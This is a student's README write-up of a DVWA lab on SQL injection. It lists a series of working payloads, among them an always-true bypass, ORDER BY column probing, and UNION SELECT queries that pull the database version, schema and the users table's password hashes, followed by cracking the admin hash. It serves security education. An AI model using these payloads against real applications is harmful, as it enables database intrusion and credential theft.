# SQL-Injection-lab-dvwa
🔐 Overview

This project documents my hands-on exploration of SQL Injection vulnerabilities using DVWA running on Kali Linux. The lab demonstrates how insecure input handling can allow attackers to interact directly with a backend database.

🎯 Objectives

- Understand how SQL Injection works
- Identify vulnerable input fields
- Enumerate database information
- Retrieve tables, columns, and sensitive data
- Highlight the security risks and lessons learned

🧪 Lab Environment

- Kali Linux
- DVWA Web Application
- Browser-based interaction

🛠️ Lab Walkthrough
🔹 Step 1: Accessing DVWA & Setting Security Level

Logged into DVWA and set the system to Low Security to begin SQL Injection testing.

<img width="975" height="478" alt="image" src="https://github.com/user-attachments/assets/9d2d84a1-f9d3-4f56-8af1-a2a6e544bb5e" />
<img width="975" height="454" alt="image" src="https://github.com/user-attachments/assets/99ae049a-465c-4037-bfb3-3ee355b29688" />

🔹 Step 2: Testing SQL Injection With “Always True” Condition

Tested using:
' OR 1=1 #

Successfully bypassed filters and retrieved full user records.

<img width="975" height="506" alt="image" src="https://github.com/user-attachments/assets/0fd79fcf-a05a-426b-9d1c-faacda39c122" />

🔹 Step 3: Determining Number of Columns (ORDER BY Testing)

Used:
1' ORDER BY 1 #
<img width="975" height="506" alt="image" src="https://github.com/user-attachments/assets/693e2533-b3ff-44b8-9137-adef6a0f19a9" />

1' ORDER BY 2 #
<img width="975" height="506" alt="image" src="https://github.com/user-attachments/assets/d90a74d6-3166-46d8-b2ed-e05d822beb33" />

1' ORDER BY 3 #
<img width="975" height="502" alt="image" src="https://github.com/user-attachments/assets/78d3be62-17b3-43a4-9ce3-f24312c611eb" />
<img width="975" height="453" alt="image" src="https://github.com/user-attachments/assets/063db0dc-b61d-40c6-ae82-4fa6492a4971" />

Discovered query returns 2 columns as order 3 results in unkownn comlumn. 

🔹 Step 4: Retrieving Database Version
1' OR 1=1 UNION SELECT 1, VERSION() #

Identified MySQL Version.

<img width="975" height="506" alt="image" src="https://github.com/user-attachments/assets/ab71fd8e-0f9c-4d56-93a2-996748123af3" />


🔹 Step 5: Retrieving Database Name
1' OR 1=1 UNION SELECT 1, DATABASE() #


<img width="975" height="506" alt="image" src="https://github.com/user-attachments/assets/1d97bb21-e77a-45b9-abcc-91d849e21936" />

🔹 Step 6: Retrieving Table Names
1' OR 1=1 UNION SELECT 1, table_name FROM information_schema.tables
WHERE table_schema='dvwa' #


<img width="975" height="506" alt="image" src="https://github.com/user-attachments/assets/2f76d706-1b67-42f4-8e02-5b444385b9fc" />

🔹 Step 7: Retrieving Column Names
1' OR 1=1 UNION SELECT 1, column_name FROM information_schema.columns
WHERE table_name='users' #


<img width="975" height="487" alt="image" src="https://github.com/user-attachments/assets/13521a84-a9cc-49c9-8899-07c38fcea776" />


🔹 Step 8: Extracting User Credentials
1' OR 1=1 UNION SELECT user, password FROM users #


<img width="974" height="444" alt="image" src="https://github.com/user-attachments/assets/9cdf9e35-e5aa-4e73-8107-a0e4f991db3d" />

🔹 Step 9: Cracking Password Hash

Used CrackStation to crack admin password.

<img width="975" height="506" alt="image" src="https://github.com/user-attachments/assets/2a1a6770-da0a-4b4c-a993-a48dcad657dd" />


🧠 Key Learning Outcomes

- How SQL Injection exploits insecure input
- Enumerating database structure safely
- Password hashing importance
- Real-world risks of exposed credentials
- Importance of Input validation, Parameterized queries, Secure coding

⚠️ Ethical Disclaimer

This lab was performed in a controlled and legal environment strictly for educational purposes.
Unauthorized testing on systems you do not own is illegal.

🙌 Acknowledgements

- DVWA Project
- CrackStation
- Cybersecurity learning community (ParoCyber institution)

Thank you for taking your time to review my work. until we meet again
